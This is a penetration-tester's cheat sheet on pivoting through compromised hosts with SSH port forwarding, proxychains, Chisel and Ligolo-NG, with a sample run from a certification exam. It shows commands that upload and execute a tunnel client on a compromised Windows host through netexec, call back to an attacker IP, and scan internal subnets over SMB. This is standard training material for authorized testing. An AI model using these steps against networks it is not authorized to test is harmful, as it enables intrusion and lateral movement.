# Dynamic Port Forwarding with SSH & SOCKS

## Local Port forward using SSH
> Most useful for services that are not available to anything but localhost.
* Forward a single port on the local host to a single port on a remote host.
```bash
ssh -L [local port]:localhost:[remote port] [user]@[$IP]
```
* Forward multiple ports
```bash
ssh -L [local port]:localhost:[remote port] -L [local port]:localhost:[remote port] [user]@[$IP]
```

## Dynamic Port Forwarding using SSH (SSH Tunneling over SOCKS)
* Verify proxychains is set up for Dynamic Port Forwarding
```bash
tail -4 /etc/proxychains4.conf

# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```
* Setup the tunnel over SSH
```bash
ssh -D [localport] [user]@[$IP]
```
* Verify
```bash
proxychains4 -q nxc smb [remote subnet] -u '' -p ''
```

# Pivoting with [Chisel](https://github.com/jpillora/chisel)
## Reverse Tunnel
### Setup
* Download the appropriate binaries for the target and attack host
* Verify you have command execution on the pivot host
* Upload the appropriate binary to the compromised pivot host:
```bash
# example using netexec
nxc smb $IP -u [user] -p [pass] --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
```
### Execution
* Start the server on the attack host
```bash
./chisel server --reverse
```
* Connect the chisel client (on the pivot host) to the server (on the attack host)
```bash
# Example using netexec
nxc smb $IP -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe client [attacker IP]:8080 R:socks'
```
* Verify server recieved the connection
```bash
# Example
2022/11/06 10:57:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
* Verify proxychains is setup for the tunnel
```bash
tail /etc/proxychains4.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```
* Verify connection
```bash
# Example using netexec
proxychains4 -q nxc smb $IP -u [user] -p [pass] --shares

# or even better, scan the whole subnet
proxychains4 -q nxc smb [subnet]/[CIDR]
```
* Killing chisel on the pivot host
```bash
# Example using netexec
nxc smb $IP -u [user] -p [pass] -X 'Stop-Process -Name chisel -Force'
```
'CTRL-C' to kill the server on the attack host

## Straight Tunnel
* Same setup as the reverse tunnel
* Start the server on the pivot host
```bash
# Example using netexec
nxc smb $IP -u [user] -p [pass] -x 'C:\Windows\Temp\chisel.exe server --socks5'
```
* Connect to the chisel server from our attack host
```bash
sudo chisel client [IP]:[port] socks
```
* Entries in /etc/proxychains4.conf are the same as for the reverse tunnel.
* Verify operation
```bash
sudo proxychains4 -q nxc smb $IP -u [user] -p [pass] --shares
```

# [Ligolo-NG](https://github.com/nicocha30/ligolo-ng)
## Setting up the pivot host (The machine your tunneling through to reach another network)
### Upload and configure the appropriate binary to the pivot host
> Find the latest binaries on the releases page [here](https://github.com/Nicocha30/ligolo-ng)
- Connect the agent to the pivot host.
```bash
# Linux & Windows
./agent -connect [AttackerIP]:port -v -accept-fingerprint [Cert Fingerprint noted below]
```
- Configure the agent to receive a connection from the attacker machine
```
./agent
* ligolo-agent -bind 127.0.0.1:[port]
# You should see the agent bind on the attacker machine.
```
## Attacker Machine Setup
### Proxy Setup
- Run the agent
```
sudo ./proxy -autocert
```
- Note down the certificate fingerprint
- Setup the interface
```bash
ligolo-ng >> interface_create --name "[Insert creative stupid name here]"
```
- Connect to the agent (if connecting to the agent, rather than recieving a connection from the agent.
```
ligolo-ng >> connect_agent --ip [IP]:[port]
```
- When the agent is connected, a session should appear on the proxy similar to:
```
INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
```
- Use `session` to select the agent
```
ligolo-ng >> session
# Select the appropriate numbered agent
```
- Start the tunnel
```
[Agent : [user@hostname] >> tunnel_start --tun [Insert creative stupid name created above here]
```
- Setup routing
```
# Manually
sudo ip route add [dest_subnet/cidr] dev ligolo

# Ligolo-NG
interace_add_route --name [creative stupid name] --route [dest net/cidr]
```

## Ligolo-NG Example usage from PNPT exam
- upload to target host
```
scp -i example -r tools/agent example@host.exampledomain.com:/home/adminuser/agent
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'example':
```
- Setup attack host
```
sudo tools/proxy -autocert
[sudo] password for chvxt3r: 
INFO[0000] Loading configuration file ligolo-ng.yaml 
INFO[0000] Listening on 0.0.0.0:11601 
 __ _ __ 
 / / (_)___ _____ / /___ ____ ____ _
 / / / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/ /_/ /_/\__, / 
 /____/ /____/ 
 Made in France ♥ by @Nicocha30!
 Version: 0.8.2
ligolo-ng » interface_create --name 'test'
INFO[0010] Creating a new test interface... 
INFO[0010] Interface created! 
ligolo-ng » 
```
- Setup agent on target host
```
//agent -bind 10.10.155.5:4444
WARN[0000] TLS Certificate fingerprint is: 
4159B530249476ACF6A170F5A484B434B1B96925DBF6DE160CCC300D25FA8A8A 
INFO[0000] Listening on 10.10.155.5:4444...
```
- Connection from attack host to target host
```
ligolo-ng » connect_agent --ip 10.10.10.200:4444
? TLS Certificate Fingerprint is: 
4159B530249476ACF6A170F5A484B434B1B96925DBF6DE160CCC300D25FA8A8A, connect? Yes
INFO[0240] Agent connected. id=02be4cad2165 name=adminuser@mail 
remote="10.10.10.200:4444"
```
- Configure the session on the attack host
```
ligolo-ng » session
? Specify a session : 1 - example@host - 10.10.10.200:4444 - 02be4cad2165
```
- Start the tunnel (attack host)
```
[Agent : example@host] » tunnel_start --tun test
```
- Setup routing
```
sudo ip route add 10.10.10.0/24 dev pasta
```
- Verify tunnel
```
for i in {1..254}; do (ping -c 1 10.10.10.$i | grep "bytes from" &) ; done
```
# Todo
- [ ] Test Ligolo
